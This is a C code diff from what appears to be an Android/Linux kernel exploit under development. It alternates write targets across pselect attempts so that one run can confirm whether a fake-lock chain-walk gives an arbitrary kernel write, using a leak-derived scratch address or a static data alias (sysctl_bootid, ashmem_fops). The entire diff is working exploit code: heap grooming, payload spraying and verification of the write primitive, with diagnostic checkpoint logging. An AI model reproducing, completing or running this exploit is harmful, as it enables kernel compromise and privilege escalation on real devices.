@@ -259,6 +259,19 @@ void do_pselect_fake_lock_route(void) {
       shift_idx_store((sweep_idx + 1) % SHIFT_SWEEP_N);
       sweep_idx++;
     }
+    /* Alternate the write-proof target per attempt so ONE run separates the two
+     * remaining candidates (see util.c scratch_proof_active):
+     *   odd  attempts -> page_base + SCRATCH_OFF   (LEAK-derived address; proves
+     *                    the store executes, independent of any alias formula)
+     *   even attempts -> data_addr(&sysctl_bootid) (static P0_DATA_ALIAS; proves
+     *                    the alias/delta itself)
+     * Must be set BEFORE prepare_good_kernel_page(), which bakes the target into
+     * the sprayed payload. */
+    if (bootid_write_proof_enabled() && !signal_miss_retry) {
+      scratch_proof_active = (route_attempt & 1) ? 1 : 0;
+      bootid_proof_active = scratch_proof_active ? 0 : 1;
+    }
+
     /* On a signal-miss retry the payload page is still intact (no write
      * happened), so skip the expensive re-groom and just re-run pselect. */
     if (route_attempt != 1 && !signal_miss_retry) {
@@ -346,9 +359,12 @@ void do_pselect_fake_lock_route(void) {
      * walk to fire on the pre-pselect stack. The consumer now waits on
      * pselect_armed, which is stored as the last thing before the syscall. */
     pr_success("ckpt: pselect attempt=%d arming shift=%d target=%016llx "
-               "(bootid_proof=%d)\n",
+               "proof=%s\n",
                route_attempt, pselect_runtime_shift,
-               (unsigned long long)pselect_write_target(), bootid_proof_active);
+               (unsigned long long)pselect_write_target(),
+               scratch_proof_active ? "scratch(leaked)"
+                                    : (bootid_proof_active ? "bootid(alias)"
+                                                           : "fops"));
     /* Pristine copies of the armed overlay: on a SUCCESSFUL return
      * core_sys_select overwrites in/out/ex with the res_* sets, so a re-entry
      * must restore the fake-waiter words first (on an error/signal return the
@@ -426,6 +442,36 @@ void do_pselect_fake_lock_route(void) {
      * read *&ashmem_misc.fops, which holds the SLID &ashmem_fops, into
      * sysctl_bootid and read it out of /proc). So every attempt here stays on the
      * harmless bootid target. */
+    /* SCRATCH-WRITE-PROOF (odd attempts): the store went to a LEAK-derived address
+     * inside the sprayed page, so recv()ing the reclaim sk_buffs shows it directly.
+     * landed=1 => the chain-walk store executes on-device and the only thing left
+     * is the static alias/delta used for kernel-image targets. landed=0 with
+     * walks>0 => the walk still is not reaching rt_mutex_dequeue. */
+    if (scratch_proof_active) {
+      int landed = scratch_diag_readback((uint64_t)pselect_write_value());
+      pr_success("ckpt: SCRATCH-WRITE-PROOF attempt=%d walks=%d target=%016llx "
+                 "value=%016llx landed=%d\n",
+                 route_attempt, atomic_load(&consumer_success),
+                 (unsigned long long)binwrite_target,
+                 (unsigned long long)pselect_write_value(), landed);
+      close(high_read);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
+      close(pipefd[0]);
+      close(pipefd[1]);
+      if (landed) {
+        pr_success("ckpt: SCRATCH-WRITE-PROOF POSITIVE attempt=%d — the chain-walk "
+                   "store EXECUTES on-device. Remaining bug is the static "
+                   "P0_DATA_ALIAS target (delta), not the walk.\n",
+                   route_attempt);
+        atomic_store(&punch_consume_stop, 1);
+        cfi_last_step = 0;
+        break;
+      }
+      continue;
+    }
+
     if (bootid_proof_active) {
       char bootid_after[64] = "?";
       read_first_line("/proc/sys/kernel/random/boot_id", bootid_after,
